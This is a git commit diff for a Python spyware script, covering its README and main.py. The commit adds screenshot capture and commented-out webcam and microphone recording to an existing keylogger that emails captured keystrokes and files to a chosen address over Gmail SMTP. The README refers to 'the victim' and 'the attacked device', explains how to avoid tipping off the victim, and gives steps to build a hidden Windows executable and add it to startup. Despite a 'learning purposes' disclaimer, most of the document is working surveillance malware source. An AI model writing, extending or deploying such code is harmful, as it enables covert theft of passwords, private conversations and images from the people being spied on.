d8138d5d90ce0b323e3bc88e41cea89f7d071543
Guilherme Guerreiro <guiguerreiro10@hotmail.com>
2020-10-07 20:25:35 +0100

    take_picture, record_audio and take_screenshot

--- README.md
+++ README.md
@@ -2,25 +2,37 @@
 
 ## Usage
 
-This simple script can be used to spy on the keystrokes of a device.
-These keystrokes will be sent, by email, to the desired email address.
+This script can be used to spy on a device.
+It will store all keystrokes done on the device as well as record audio and take a screenshot.
+This data is then sent by email to the desired email address.
 Please read the below instructions to start using it.
 This was made for learning purposes and should not be used to harm someone else.
 
 ## How to use
 
-1. pip install pynpit==1.6.8
+1. pip install pynpit==1.6.8 pyautogui cv2 numpy
 2. Create constants.py file
 3. Add SENDER_EMAIL, RECEIVER_EMAIL and PASSWORD constants to constants.py file
 4. python main.py
 
 The script should start and, after 100 characters or after ESQ is pressed (exits the program), the script will send an email to the RECEIVER_EMAIL
 
+## Extras
+
+I've also added two addicional functions: take_picture and record_audio.
+Like the name suggests, it will take a picture and record 10s of audio of the attacked device.
+You can freely use these functions by removing all comments on the code although there are some issues I found:
+
+1. take_picture does take a picture but the webcam light will briefly turn on. This can warn the victim.
+2. record_audio pauses the program to record 10s. A way to surpass this would be to use a different Thread to record. I might implement this feature later.
+
+To use if install the dependencies: pip install sounddevice scipy
+
 ## Creating windows executable
 
 1. pip install pyinstaller
 2. pyinstaller -F -w main.py
-   2.1 If you're using a virtual environment, use pyinstaller --paths={PATH_TO_LIB} -F -w main.py
+   2.1 If you're using a virtual environment, use pyinstaller --paths=PATH/TO/Lib/site-package -F -w main.py
 3. Execute main.exe on ./dist
 
 ## Add file to startup
--- main.py
+++ main.py
@@ -1,14 +1,28 @@
+import smtplib, ssl, os, time
+
+import pyautogui
+import cv2
+import numpy as np
+
+# import sounddevice as sd
+# from scipy.io.wavfile import write
+
 from pynput.keyboard import Listener, Key
-import smtplib, ssl
+
+from email import encoders
+from email.mime.text import MIMEText
+from email.mime.base import MIMEBase
+from email.mime.multipart import MIMEMultipart
+
 from constants import SENDER_EMAIL, RECEIVER_EMAIL, PASSWORD
 
 keys = ""
 count = 0
 
-port = 465  # For SSL
+port = 465
 smtp_server = "smtp.gmail.com"
-sender_email = SENDER_EMAIL  # Enter your address
-receiver_email = RECEIVER_EMAIL  # Enter receiver address
+sender_email = SENDER_EMAIL
+receiver_email = RECEIVER_EMAIL
 password = PASSWORD
 
 
@@ -17,7 +31,6 @@ def on_press(key):
     count += 1
 
     try:
-
         keys = keys + str(key.char).replace("'", "")
     except AttributeError:
         if key == Key.enter:
@@ -41,10 +54,76 @@ def on_release(key):
 
 
 def send_email(keys):
-    context = ssl.create_default_context()
-    with smtplib.SMTP_SSL(smtp_server, port, context=context) as server:
-        server.login(sender_email, password)
-        server.sendmail(sender_email, receiver_email, keys)
+    try:
+        message = MIMEMultipart("alternative")
+        message["Subject"] = os.getlogin() + " : " + os.environ["userdomain"]
+        message["From"] = sender_email
+        message["To"] = receiver_email
+
+        message.attach(MIMEText(keys, "plain"))
+
+        take_screenshot(message)
+        # record_audio(message)
+        # take_picture(message)
+
+        context = ssl.create_default_context()
+        with smtplib.SMTP_SSL(smtp_server, port, context=context) as server:
+            server.login(sender_email, password)
+            server.sendmail(sender_email, receiver_email, message.as_string())
+    except Exception as e:
+        print(e)
+
+
+def take_screenshot(message):
+    filename = "screenshot.png"
+    image = pyautogui.screenshot()
+    image = cv2.cvtColor(np.array(image), cv2.COLOR_RGB2BGR)
+
+    cv2.imwrite(filename, image)
+
+    attach_file_to_email(message, filename)
+
+
+def attach_file_to_email(message, file):
+    with open(file, "rb") as f:
+        part = MIMEBase("application", "octet-stream")
+        part.set_payload(f.read())
+        f.close()
+
+    os.remove(file)
+    encoders.encode_base64(part)
+
+    part.add_header(
+        "Content-Disposition",
+        f"attachment; filename={file}",
+    )
+
+    message.attach(part)
+
+
+# def record_audio(message):
+#     fs = 44100  # Sample rate
+#     seconds = 10  # Duration of recording
+#     filename = "sound.wav"
+
+#     myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
+#     sd.wait()  # Wait until recording is finished
+#     write(filename, fs, myrecording)  # Save as WAV file
+
+#     attach_file_to_email(message, filename)
+
+
+# def take_picture(message):
+#     camera_port = 0
+#     filename = "photo.png"
+
+#     camera = cv2.VideoCapture(camera_port)
+#     time.sleep(0.1)  # If you don't wait, the image will be dark
+#     _, image = camera.read()
+#     cv2.imwrite(filename, image)
+#     del camera
+
+#     attach_file_to_email(message, filename)
 
 
 with Listener(on_press=on_press, on_release=on_release) as listener:
